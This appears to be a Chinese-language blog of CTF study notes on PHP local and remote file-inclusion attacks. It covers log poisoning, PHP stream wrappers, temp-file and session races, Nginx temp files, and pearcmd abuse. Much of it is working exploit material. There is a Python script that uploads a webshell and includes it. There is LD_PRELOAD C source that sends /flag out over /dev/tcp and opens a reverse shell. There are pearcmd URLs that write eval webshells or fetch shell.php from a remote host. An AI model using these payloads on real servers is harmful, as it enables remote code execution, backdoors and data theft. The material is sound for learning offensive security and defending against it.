---
title: LFI
date: 2023-08-25 19:53:48
categories:
- 网络安全
tags:
- web 
description: |
    文件包含
---

## 前言

关于文件包含,记叙的有点杂乱,新开一篇文章,专门学习一下LFI和RFI

## 常见的引发漏洞的函数

1. `include()`执行到`include`时才包含文件，文件不存在时提出警告，但是**继续执行**。

2. `require()`只要程序运行就会包含文件，文件不存在产生致命错误，并**停止脚本**。

3. `include_once()`和`require_once()`只执行一次，如果一个文件已经被包含，则这两个函数不会再去包含（即使文件中间被修改过）。

   当利用这四个函数来包含文件时，**不管文件是什么类型**（图片、txt等等），其中的文本内容都会直接作为php代码进行解析。

## 文件包含

**本地文件包含**
以下

1. 包含本地文件、执行代码
2. 配合文件上传，执行恶意脚本
3. 读取本地文件
4. 通过包含日志的方式GetShell
5. 通过包含`/proc/self/envion`文件GetShell
6. 通过伪协议执行恶意脚本
7. 通过`phpinfo`页面包含临时文件

**远程文件包含**
直接执行远程脚本（在本地执行）

> 远程文件包含需要在`php.ini`中进行配置，才可开启：
>
> `allow_url_fopen = On`：本选项激活了 URL 风格的 fopen 封装协议，使得可以访问 URL 对象文件。默认的封装协议提供用 ftp 和 http 协议来访问远程文件，一些扩展库例如 zlib 可能会注册更多的封装协议。*（出于安全性考虑，此选项只能在 php.ini 中设置。）*
>
> `allow_url_include = On`：此选项允许将具有URL形式的fopen包装器与以下功能一起使用：include，include_once，require，require_once。（该功能要求`allow_url_fopen`开启）

## LFI

### 包含http日志文件

通过包含**日志文件**，来执行夹杂在URL请求或者`User-Agent`头中的恶意脚本

```php
apache+Linux #日志默认路径
/var/log/apache/access.log
/var/log/apache2/access.log
/var/www/logs/access.log
/var/log/access.log
/etc/httpd/logs/access_log
/var/log/httpd/access_log
配置：
/etc/apache2/apache2.conf
/etc/httpd/conf/httpd.conf
  
xmapp日志默认路径
D:/xampp/apache/logs/access.log
D:/xampp/apache/logs/error.log
  
IIS默认日志文件
C:/WINDOWS/system32/Logfiles
%SystemDrive%/inetpub/logs/LogFiles
  
nginx
日志：
/var/log/nginx/access.log
/var/log/nginx/error.log
/opt/nginx/logs/access.log
配置：
/etc/nginx/nginx.conf
/usr/local/nginx/conf/nginx.conf
```

### ssh日志文件包含

和包含HTTP日志类似，登录用户的用户名会被记录在日志中，如果可以读取到ssh日志文件，则可以利用恶意用户名注入php代码。

SSH登录日志常见存储位置：`/var/log/auth.log`或`/var/log/secure`

eg:`ssh <?php phpinfo();?>@ip`

### 用PHP伪协议

PHP内置了很多URL 风格的封装协议，除了用于文件包含，还可以用于很多文件操作函数。在phpinfo的`Registered PHP Streams`中可以找到目前环境下可用的协议。

```kotlin
file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 压缩文件
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```

1. `file://`访问**本地**文件系统`http://target.com/?page=file://D:/www/page.txt`，正反斜线都行（windows），对于共享文件服务器可以使用`\\smbserver\share\path\to\winfile.ext`。
2. `php://input`访问输入输出流：`?page=php://input`，在POST内容中输入想要执行的脚本。
3. `php://filter`：是一种元封装器， 设计用于数据流打开时的筛选过滤应用。
4. `data://`数据流封装：`?page=data://text/plain,<?php phpinfo();?>`
5. `zip://`压缩流：创建恶意代码文件，添加到压缩文件夹，上传，**无视后缀**。通过`?page=zip://绝对路径%23文件名`访问，5.2.9之前是只能绝对路径。

**备注：**

1. 文件需要绝对路径才能访问

2. 需要通过`#`（也就是URL中的`%23`）来指定代码文件

3. `compress.bzip2://`和`compress.zlib://`压缩流，与zip类似，但是**支持相对路径**，**无视后缀**

   `bzip`和`gzip`是对单个文件进行压缩（不要纠结要不要指定压缩包内的文件😄）

   ```delphi
   ?file=compress.bzip2://路径
   ?file=compress.zlib://路径
   ```

4. `phar://`支持zip、phar格式的压缩（归档）文件，**无视后缀**（也就是说jpg后缀照样给你解开来），`?file=phar://压缩包路径/压缩包内文件名`，绝对路径和相对路径都行。

   利用方法：

   ```cmake
   index.php?file=phar://test.zip/test.txt
   index.php?file=phar://test.xxx/test.txt
   ```

### 临时文件包含

**假如在服务器上找不到我们可以包含的文件，那该怎么办，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件了。**

目前，常见的两种临时文件包含漏洞利用方法主要是：`PHPINFO()` and `PHP7 Segment Fault`，利用这两种奇技淫巧可以向服务器上传文件同时在服务器上生成恶意的临时文件，然后将恶意的临时文件包含就可以达到任意代码执行效果也就可以拿到服务器权限进行后续操作。

#### 全局变量

在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。上传的文件信息会保存在全局变量$_FILES里。

$_FILES超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过PHP脚本上传到服务器的文件至关重要。

```php
$_FILES['userfile']['name'] 客户端文件的原名称。
$_FILES['userfile']['type'] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如"image/gif"。
$_FILES['userfile']['size'] 已上传文件的大小，单位为字节。
$_FILES['userfile']['tmp_name'] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。
$_FILES['userfile']['error'] 该文件上传的错误代码，上传成功其值为0，否则为错误信息。
12345
```

在临时文件包含漏洞中`$_FILES['userfile']['name']`这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。

#### 存储目录

文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的`upload_tmp_dir`属性指定，假如`upload_tmp_dir`的路径不可写，PHP会上传到系统默认的临时目录中。

不同系统服务器常见的临时文件默认存储目录，了解系统的默认存储路径很重要，因为在很多时候服务器都是按照默认设置来运行的

**Linux目录**
Linxu系统服务的临时文件主要存储在**根目录的tmp文件夹下，具有一定的开放权限**。

```bash
/tmp/
```

**Windows目录**
Windows系统服务的临时文件主要存储在**系统盘Windows文件夹下，具有一定的开放权限**。

```bash
C:/Windows/
C:/Windows/Temp/
```

Linux临时文件主要存储在`/tmp/`目录下，格式通常是（`/tmp/php[6个随机字符]`）

Windows临时文件主要存储在`C:/Windows/`目录下，格式通常是（`C:/Windows/php[4个随机字符].tmp`）

#### phpinfo页面的竞争包含

临时文件存活时间很短，当连接结束后，临时文件就会消失。**条件竞争**

只要发送足够多的的数据，让页面还未反应过来的时候去包含文件，即可。

1. 发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据

2. 因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大

3. php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接

4. 所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包

5. 此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除

6. 利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell

   利用脚本[exp](https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py)

#### session文件包含

>session.auto_start：如果 session.auto_start=On ，则PHP在接收请求的时候会自动初始化 Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，
>
>session.use_strict_mode默认值为 off。此时用户是可以自己定义 Session ID 的。比如，我们在 Cookie 里设置 PHPSESSID=ph0ebus ，PHP 将会在服务器上创建一个文件：/tmp/sess_ph0ebus”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的 session.upload_progress.name 值组成，最后被写入 sess_ 文件里。
>session.save_path：负责 session 文件的存放位置，后面文件包含的时候需要知道恶意文件的位置，如果没有配置则不会生成session文件
>
>session.upload_progress_enabled：当这个配置为 On 时，代表 session.upload_progress 功能开始，如果这个选项关闭，则这个方法用不了
>
>session.upload_progress_cleanup：这个选项默认也是 On，也就是说当文件上传结束时，session 文件中有关上传进度的信息立马就会被删除掉；这里就给我们的操作造成了很大的困难，我们就只能使用条件竞争(Race Condition)的方式不停的发包，争取在它被删除掉之前就成功利用
>
>session.upload_progress_name：当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控
>
>session.upload_progress_prefix：它＋session.upload_progress_name 将表示为 session 中的键名
>脚本在PHP文件夹里

Session文件内容有两种记录格式：php、php_serialize，通过修改`php.ini`文件中`session.serialize_handler`字段来进行设置。

**以php格式记录时**，文件内容中以`|`来进行分割

**以php_serialize格式记录时**，将会话内容以序列化形式存储

如果保存的session文件中字符串可控，那么就可以构造恶意的字符串触发文件包含。

##### 自己构造Session

有的网站可能不提供用户会话记录，但是默认的配置可以让我们自己构造出一个Session文件。相关的选项如下：

- `session.use_strict_mode = 0`，允许用户自定义Session_ID，也就是说可以通过在Cookie中设置`PHPSESSID=xxx`将session文件名定义为`sess_xxx`
- `session.upload_progress.enabled = on`，PHP可以在每个文件上传时监视上传进度。
- `session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"`，当一个上传在处理中，同时POST一个与INI中设置的`session.upload_progress.name`同名变量时，上传进度可以在`$_SESSION`中获得。 当PHP检测到这种POST请求时，它会在`$_SESSION`中添加一组数据, 索引是`session.upload_progress.prefix`与 `session.upload_progress.name`连接在一起的值。

##### 利用思路

1. 上传一个文件

2. 上传时设置一个自定义`PHPSESSID`cookie

3. POST `PHP_SESSION_UPLOAD_PROGRESS`恶意字段：`"PHP_SESSION_UPLOAD_PROGRESS":'<?php phpinfo();?>'`

   这样就会在Session目录下生成一个包含恶意代码的session文件。

session竞争的脚本在另一个文件夹

#### 包含环境变量

**CGI利用条件**：

`1、php以cgi方式运行，这样environ才会保存UA头。`

`2、environ文件存储位置已知，且environ文件可读。`

**利用姿势**：proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。

#### CVE-2018-14884

CVE-2018-14884会造成php7出现段错误，从而导致垃圾回收机制失效，POST的文件会保留在系统缓存目录下而不会被清除。

> 影响版本：
>
> PHP Group PHP 7.0.*，<7.0.27
> PHP Group PHP 7.1.*，<7.1.13
> PHP Group PHP 7.2.*，<7.2.1

windows 临时文件：`C:\windows\php<随机字符>.tmp`

linux临时文件：`/tmp/php<随机字符>`

- 漏洞验证`include.php?file=php://filter/string.strip_tags/resource=index.php`返回500错误

- post恶意字符串

```python
#author:yu22x
import requests 
import re 
url = "http://e34a803b-ce00-4e1e-b585-9bda0198fe37.challenge.ctf.show/"
file={
 'file':'<?php system("cat /*");?>'
}
requests.post(url+'?file=php://filter/string.strip_tags/resource=/etc/passwd',files=file)
r=requests.get(url)
#print(r.text)
tmp=re.findall('=> (php.*?)\\n',r.text,re.S)[-1]
r=requests.get(url+'?file=/tmp/'+tmp)
print(r.text)
#php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA 这个也会导致crash
```

先到这里

#### nginx

##### `Nginx的临时文件`和`LD_PRELOAD`加载so

- Nginx的临时文件:

  当 Nginx 接收来自 FastCGI 的响应时，若大小超过限定值(大概32Kb)不适合以内存的形式来存储的时候，一部分就会以临时文件的方式保存到磁盘上。在 `/var/lib/nginx/fastcgi` 下产生临时文件。

- LD_PRELOAD加载so:

  这个可以说是经典问题就不赘述了, 直接给个exp

```c
#include <stdlib.h>
#include <string.h>
__attribute__ ((constructor)) void call ()
{
 unsetenv("LD_PRELOAD");
 char str[65536];
 system("bash -c 'cat /flag' > /dev/tcp/pvs/port");
 system("cat /flag > /var/www/html/flag");
}

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload() {
    //反弹shell
    system("bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'");
}

char *strcpy (char *__restrict __dest, const char *__restrict __src) {
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    payload();
}

gcc -shared -fPIC /test/hack.c -o hack.so -ldl
export LD_PRELOAD=/test/hack.so
```

 上面提到当Nginx的fastcgui接收到的响应大小超过32Kb就会在`/var/lib/nginx/fastcgi`产生一个存放相应内容的临时文件, 但其实这个过程可以说是稍纵即逝,文件创建到删除的窗口期根本不足以让我们及时的就行文件加载, 这时候就用到了记录进程信息的文件夹`/proc/pid/fd`。 在Linux上，在一个进程中打开的文件描述符集可以在/proc/PID/fd/路径下访问，其中PID是进程标识符。

 在这里面存放有进程打开的全部资源文件的软链接, 最重要的是即使临时文件被删除了也还是一样可以被正常读取

所以我们就可以将临时文件上传控制为我们的恶意so文件, 然后设置payload为

```api
?env=LD_PRELOAD=/proc/pid/fd/file_id
```

之后执行的echo命令会加载我们so文件劫持的函数加载恶意代码从而获取flag

**总结起来整个过程就是：**

1. 让后端 php 请求一个过大的文件
2. Fastcgi 返回响应包过大，导致 Nginx 需要产生临时文件进行缓存
3. 虽然 Nginx 删除了`/var/lib/nginx/fastcgi`下的临时文件，但是在 `/proc/pid/fd/` 下我们可以找到被删除的文件
4. 遍历 pid 以及 fd ，修改LD_PRELOAD完成 LFI

详情见`LFI/nginx`中的exp

##### fastcgi外的临时文件

实际上除了`/var/lib/nginx/fastcgi`会新建临时文件暂存请求数据外, 在`/var/lib/nginx/body`下也建立存放请求数据的有临时文件(当请求体足够大的时候,32Kb肯定是足够的), 文件的格式为`/client_body_temp/xxxxxxxxxx`(前面的为0,后面为数字例如0000000001)。

但是这个临时文件保存是否会执行也是有一定的限制的, 这个限制就是上文要保留临时文件的第一种情况:`client_body_in_file_only`配置开启, 这个配置的说明为`Determines whether nginx should save the entire client request body into a file`(决定nginx是否应该将整个客户端请求正文保存到一个文件中), 但很可惜在默认下它是Off。

虽然这个文件也很快就会被删除, 但是在`/proc/pid/fd`下也还是会有链接指向这个文件。

如果打开了配置设置为`On`的话那我们题目中所加载的so文件是`fastcgi`文件夹下的还是`body`文件夹下的我们也不得而知了哈哈哈。

##### another

如果觉得对这道题的知识掌握了的话可以看一下下面这道题![img](https://s2.loli.net/2022/03/23/58aiboes1qcuKk9.png)

```php
<?php 
($_GET['action'] ?? 'read' ) === 'read' ? readfile($_GET['file'] ?? 'index.php') : include_once($_GET['file'] ?? 'index.php');
```

 这个题其实就是EZPHP的原型之一, 但EZPHP使用了命令注入的外壳来加载so文件。 使用Nginx临时文件配合`/proc`的`LFI`方法早在去年的`HXPCTF`就已经有了(更早的就不知道了), 但是实际上这道题更加容易解决, 为什么这么说呢 ?原因如下:

1. 可以通过read参数读取`/proc/pid/cmdline`得到`Nginx Worker`的具体pid
2. 只要写入php文件即可包含文件执行系统命令带出flag

但是还和EZPHP有区别的一点就是绕过`include_once()`函数。 `include` 函数，在进行包含的时候，会使用 `php_sys_lstat` 函数判断路径，绕过方法可以直接参考[php源码分析 require_once 绕过不能重复包含文件的限制](https://www.anquanke.com/post/id/213235#h3-5)。

##### 长链接窗口期绕过文件检测

可以使用`compress.zip://`流上传任意文件（`compress.zip://http`或者`compress.zip://ftp`，前提是开启`allow_url_include`），在此过程中会生成临时文件，然后再经过一系列操作之后绕过WAF并且保存临时文件，最终实现RCE

1. 我们可以使用`compress.zip://`流进行上传任意文件并保持 HTTP 长链接竞争保存我们的临时文件
2. 使用pwntools 起一个服务用来发送一个大文件
3. 传输恶意代码数据, 然后会被保存在一个临时文件
4. 注意延时让题目环境有足够的时间去包含文件或使用`compress.zlib://ftp://`形式，控制 FTP 速度
5. 利用超长的 name 溢出 output buffer 得到 sandbox 路径
6. 利用 Nginx 配置错误，通过 `.well-known../files/sandbox/`来获取我们 tmp 文件的文件名
7. 发送另一个请求包含我们的 tmp 文件，此时并没有 PHP 代码
8. 绕过 WAF 判断后，发送 PHP 代码段，包含我们的 PHP 代码拿到 Flag

整个题目的关键点主要是以下几点(来自 @wupco)：

1. 需要利用大文件或ftp速度限制让连接保持
2. 传入name过大 overflow output buffer，在保持连接的情况下获取沙箱路径
3. tmp文件需要在两种文件直接疯狂切换，使得第一次`file_get_contents`获取的内容不带有`<?`,`include`的时候是正常php代码，需要卡时间点，所以要多跑几次才行
4. `.well-known../files/`是nginx配置漏洞，就不多说了，用来列生成的tmp文件

贴个`[链接]()`????我链接呢,脚本在LFI/nginx里

题目

```php
<?php
declare(strict_types=1);

$rand_dir = 'files/'.bin2hex(random_bytes(32));
mkdir($rand_dir) || die('mkdir');
putenv('TMPDIR='.__DIR__.'/'.$rand_dir) || die('putenv');
echo 'Hello '.$_POST['name'].' your sandbox: '.$rand_dir."\n";

try {
    if (stripos(file_get_contents($_POST['file']), '<?') === false) {
        include_once($_POST['file']);
    }
}
finally {
    system('rm -rf '.escapeshellarg($rand_dir));
}

```

### 使用php://filter将任意文件转换成Webshell

题目

```php
<?php ($_GET['action'] ?? 'read' ) === 'read' ? readfile($_GET['file'] ?? 'index.php') : include_once($_GET['file'] ?? 'index.php');
```

万恶的iconv 脚本在`/Users/dionysus/CTF/rce/base64filter_rce.php`

### pear文件包含

```php
?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=eval($_POST[1]);?>+/tmp/a.txt
  
1、下载远程文件
?file=/usr/local/lib/php/pearcmd.php&aaa+install+-R+/var/www/html/+http://远程ip/shell.php

<?php
echo "<?php system(\$_POST[1]);";

注意这里我用的是echo，而不是直接的shell，是因为这个过程是先读取文件的内容，然后再写入
/var/www/html/tmp/pear/download/shell.php

2、写入配置文件到/tmp/shell.php
?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/shell.php+-d+man_dir=<?php eval($_POST[1]);?>+-s+

3、日志配置文件写马到目录
?file=/usr/local/lib/php/pearcmd.php&aaa+config-create+/var/www/html/<?=`$_POST[1]`;?>+1.php
```

### 包含恶意so文件

这些so文件都需要在正确的系统,正确的php版本和正确的架构下编译

编译命令都是`gcc -shared -fPIC hack.c -o hack.so`格式

php disable_function禁用的是php函数，而恶意so中调用的是C语言库中的system函数

#### getuid劫持

php启动**新进程**时，调用getuid来确认 进程属主(执行权限）

看id调用了哪些c语言库函数
 编译同名函数进行劫持

##### php中哪些函数会产生新进程呢？

- 命令执行类 system shell_exec exec passthru
- 进程类 proc_open popen pcntl类
- 外部程序调用类 mail imap_mail
- 扩展缺陷类 imagick
  
产生新进程时 会调用getuid -->确定进程属主

#### 构造器劫持

通用劫持方法 不用比对不同的函数
劫持构造器
构造器能自定函数

GCC 有个 C 语言扩展修饰符 attribute((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 attribute((constructor)) 修饰的函数
    [参考](https://shadowfl0w.github.io/LD-PRELOAD%E5%AD%A6%E4%B9%A0/)

#### 临时文件写so

同上,利用脚本见web816

```php
$file = $_GET['file'];
if(isset($file) && preg_match("/^\/(\w+\/?)+$/", $file)){
 shell_exec(shell_exec("cat $file"));

}
```

web817脚本也可以去看看,和nginx的pid异曲同工

#### 无上传点的上传so

也是pid so文件还是用815的就行
